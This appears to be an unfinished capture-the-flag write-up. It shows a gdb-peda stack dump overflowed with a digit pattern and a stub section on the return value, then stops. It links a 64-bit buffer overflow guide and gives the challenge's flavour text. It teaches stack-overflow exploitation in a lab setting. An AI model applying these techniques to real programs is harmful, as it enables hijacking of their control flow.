0x7fffffffe4f0:	0x34313331	0x36313531	0x38313731	0x30323931
0x7fffffffe500:	0x32323132	0x34323332	0x36323532	0x38323732
0x7fffffffe510:	0x30333932	0x32333133	0x34333333	0x36333533
0x7fffffffe520:	0x38333733	0x30343933	0x32343134	0x34343334
0x7fffffffe530:	0x36343534	0x38343734	0xf70a3934	0x00007fff
0x7fffffffe540:	0x00401230	0x00000000	0x00000000	0x00007fff
0x7fffffffe550:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe560:	0x00000000	0x00000000	0x00401060	0x00000000
0x7fffffffe570:	0xffffe5a0	0x00007fff	0x00000000	0x00000000
0x7fffffffe580:	0x00000000	0x00000000	0x0040108a	0x00000000
0x7fffffffe590:	0xffffe598	0x00007fff	0x00000038	0x00000000
0x7fffffffe5a0:	0x00000001	0x00000000	0xffffe8c4	0x00007fff
0x7fffffffe5b0:	0x00000000	0x00000000	0xffffe912	0x00007fff
0x7fffffffe5c0:	0xffffe922	0x00007fff	0xffffe97a	0x00007fff
0x7fffffffe5d0:	0xffffe98e	0x00007fff	0xffffe9a5	0x00007fff
0x7fffffffe5e0:	0xffffe9ce	0x00007fff	0xffffe9e2	0x00007fff
0x7fffffffe5f0:	0xffffe9f8	0x00007fff	0xffffea07	0x00007fff
0x7fffffffe600:	0xffffea4b	0x00007fff	0xffffea5a	0x00007fff
0x7fffffffe610:	0xffffea74	0x00007fff	0xffffea8d	0x00007fff
gdb-peda$

```

# Understanding the Return Value


TO BE CONTINUED...

[Reference guide](https://samsclass.info/127/proj/p13-64bo.htm)

CHALLENGE DESCRIPTION

Tired of exploring the never-ending world, you lie down and enjoy the crystal clear sky. Over a million stars above your head! Enjoy the silence and the glorious stars while you rest.
